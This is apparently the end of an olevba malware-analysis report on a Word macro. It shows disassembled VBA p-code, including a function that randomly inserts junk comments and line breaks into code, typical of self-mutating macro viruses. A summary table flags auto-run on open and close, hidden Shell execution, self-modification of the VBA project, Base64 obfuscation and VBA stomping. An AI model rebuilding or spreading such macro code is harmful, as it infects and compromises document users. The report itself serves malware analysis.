' 	LitStr 0x0004 "бряк"
' 	ParamNamed ReplaceWith 
' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	MemLdWith Find 
' 	ArgsMemCall Execute 0x0003 
' Line #191:
' 	EndWith 
' Line #192:
' 	QuoteRem 0x000F 0x0009 " 9314.085"
' Line #193:
' Line #194:
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall UndoClear 0x0000 
' Line #195:
' 	QuoteRem 0x000B 0x0009 " 4174.954"
' Line #196:
' 	LineCont 0x0004 03 00 0C 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #197:
' 	LineCont 0x0004 03 00 05 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #198:
' 	QuoteRem 0x000D 0x0009 " 3945.426"
' Line #199:
' Line #200:
' 	QuoteRem 0x0000 0x0009 " 95.23213"
' Line #201:
' 	LineCont 0x0008 03 00 07 00 04 00 0B 00
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt StatusBar 
' Line #202:
' 	EndIfBlock 
' Line #203:
' 	QuoteRem 0x000C 0x0009 " 225.8831"
' Line #204:
' 	QuoteRem 0x0000 0x0009 " 1426.688"
' Line #205:
' 	Ld m 
' 	Ld e 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #206:
' 	QuoteRem 0x0002 0x0009 " 8262.369"
' Line #207:
' Line #208:
' 	EndIfBlock 
' Line #209:
' Line #210:
' 	EndWith 
' Line #211:
' Line #212:
' 	StartForVariable 
' 	Next 
' Line #213:
' 	QuoteRem 0x0003 0x0008 " 6253.21"
' Line #214:
' 	LineCont 0x0004 01 00 05 00
' 	EndIfBlock 
' Line #215:
' 	LineCont 0x0004 01 00 0E 00
' 	EndSub 
' Line #216:
' 	LineCont 0x0024 02 00 10 00 06 00 08 00 07 00 04 00 0A 00 0C 00 0B 00 05 00 0C 00 04 00 10 00 07 00 11 00 09 00 13 00 0B 00
' 	FuncDefn (Private Function foo(ByRef s As String, ByRef i As Long, ByRef res As String, id_FFFE As Boolean) As Boolean)
' Line #217:
' 	LineCont 0x0004 02 00 0E 00
' 	Dim 
' 	VarDefn tmp (As String)
' Line #218:
' 	QuoteRem 0x000E 0x0009 " 1920.175"
' Line #219:
' 	QuoteRem 0x0000 0x0009 " 340.2328"
' Line #220:
' 	QuoteRem 0x0000 0x0009 " 9265.149"
' Line #221:
' Line #222:
' 	LineCont 0x0010 01 00 07 00 09 00 0B 00 0B 00 10 00 11 00 05 00
' 	Ld s 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Paren 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #223:
' 	QuoteRem 0x0010 0x0009 " 4783.207"
' Line #224:
' 	LineCont 0x0008 01 00 07 00 02 00 0E 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #225:
' 	LineCont 0x0004 01 00 09 00
' 	ExitFunc 
' Line #226:
' 	QuoteRem 0x000F 0x0009 " 9998.419"
' Line #227:
' 	LineCont 0x0004 01 00 0B 00
' 	EndIfBlock 
' Line #228:
' 	QuoteRem 0x0000 0x0009 " 254.9154"
' Line #229:
' Line #230:
' 	QuoteRem 0x0000 0x0009 " 7862.768"
' Line #231:
' 	QuoteRem 0x0000 0x0009 " 1244.586"
' Line #232:
' 	LineCont 0x000C 01 00 06 00 05 00 04 00 0E 00 08 00
' 	Ld s 
' 	LitDI2 0x0002 
' 	ArgsLd Right 0x0002 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #233:
' 	QuoteRem 0x0001 0x0009 " 674.8163"
' Line #234:
' Line #235:
' 	QuoteRem 0x0000 0x0009 " 6130.167"
' Line #236:
' 	LineCont 0x000C 01 00 0B 00 03 00 0D 00 0D 00 05 00
' 	Ld res 
' 	Ld s 
' 	Ld s 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Concat 
' 	St res 
' Line #237:
' 	LineCont 0x0008 01 00 02 00 02 00 07 00
' 	LitVarSpecial (False)
' 	St foo 
' Line #238:
' 	QuoteRem 0x0007 0x0008 " 1144.96"
' Line #239:
' 	QuoteRem 0x0000 0x0009 " 8545.819"
' Line #240:
' 	LineCont 0x0004 01 00 07 00
' 	ExitFunc 
' Line #241:
' 	EndIfBlock 
' Line #242:
' 	QuoteRem 0x000A 0x0009 " 1067.359"
' Line #243:
' 	LineCont 0x0004 04 00 0A 00
' 	Ld res 
' 	Ld s 
' 	Concat 
' 	St tmp 
' Line #244:
' 	QuoteRem 0x000F 0x0009 " 6701.625"
' Line #245:
' 	QuoteRem 0x0000 0x0009 " 9650.506"
' Line #246:
' 	QuoteRem 0x0000 0x0009 " 4583.337"
' Line #247:
' 	QuoteRem 0x0000 0x0009 " 9101.369"
' Line #248:
' 	LineCont 0x0004 01 00 04 00
' 	LitStr 0x0000 ""
' 	St res 
' Line #249:
' Line #250:
' 	QuoteRem 0x0000 0x0009 " 5603.884"
' Line #251:
' 	LineCont 0x0004 01 00 0A 00
' 	LitDI2 0x0001 
' 	St i 
' Line #252:
' 	QuoteRem 0x0006 0x0009 " 5855.278"
' Line #253:
' 	LineCont 0x0004 03 00 08 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	While 
' Line #254:
' 	LineCont 0x000C 02 00 06 00 03 00 0C 00 04 00 08 00
' 	Ld Rnd 
' 	LitR8 0x999A 0x9999 0x9999 0x3FE9 
' 	Lt 
' 	IfBlock 
' Line #255:
' 	QuoteRem 0x0003 0x0009 " 4500.027"
' Line #256:
' 	QuoteRem 0x0000 0x0009 " 368.6839"
' Line #257:
' Line #258:
' 	LineCont 0x001C 01 00 03 00 02 00 0E 00 03 00 0E 00 04 00 0D 00 05 00 05 00 09 00 05 00 0A 00 0F 00
' 	Ld res 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x2710 
' 	Mul 
' 	ArgsLd Str 0x0001 
' 	Concat 
' 	St res 
' Line #259:
' 	QuoteRem 0x0002 0x0008 " 9727.57"
' Line #260:
' 	QuoteRem 0x0000 0x0009 " 9855.497"
' Line #261:
' 	EndIfBlock 
' Line #262:
' 	LineCont 0x0004 01 00 05 00
' 	Ld res 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St res 
' Line #263:
' 	QuoteRem 0x000B 0x0009 " 5072.772"
' Line #264:
' 	LineCont 0x0004 03 00 0C 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #265:
' 	QuoteRem 0x0006 0x0009 " 6673.072"
' Line #266:
' 	Wend 
' Line #267:
' 	LineCont 0x0008 03 00 0E 00 04 00 05 00
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld tmp 
' 	FnLen 
' 	For 
' Line #268:
' Line #269:
' 	LineCont 0x000C 02 00 08 00 08 00 05 00 0A 00 0F 00
' 	Ld res 
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Concat 
' 	St res 
' Line #270:
' 	LineCont 0x000C 01 00 0D 00 05 00 01 00 0E 00 08 00
' 	Ld tmp 
' 	Ld a 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Eq 
' 	IfBlock 
' Line #271:
' 	LineCont 0x0008 03 00 05 00 04 00 09 00
' 	Ld Rnd 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #272:
' Line #273:
' 	LineCont 0x001C 02 00 03 00 03 00 08 00 04 00 03 00 05 00 0E 00 0B 00 03 00 0E 00 02 00 0F 00 05 00
' 	Ld res 
' 	LitStr 0x0001 "_"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Rnd 
' 	LitDI2 0x0010 
' 	Mul 
' 	ArgsLd Space 0x0001 
' 	Concat 
' 	St res 
' Line #274:
' 	LineCont 0x0008 03 00 08 00 04 00 04 00
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #275:
' 	QuoteRem 0x000A 0x0009 " 5658.525"
' Line #276:
' 	EndIfBlock 
' Line #277:
' 	LineCont 0x0004 01 00 06 00
' 	EndIfBlock 
' Line #278:
' 	StartForVariable 
' 	Next 
' Line #279:
' 	QuoteRem 0x000E 0x0009 " 8619.138"
' Line #280:
' 	LineCont 0x0004 01 00 10 00
' 	LitVarSpecial (True)
' 	St foo 
' Line #281:
' 	LineCont 0x0004 01 00 0E 00
' 	EndFunc 
' Line #282:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

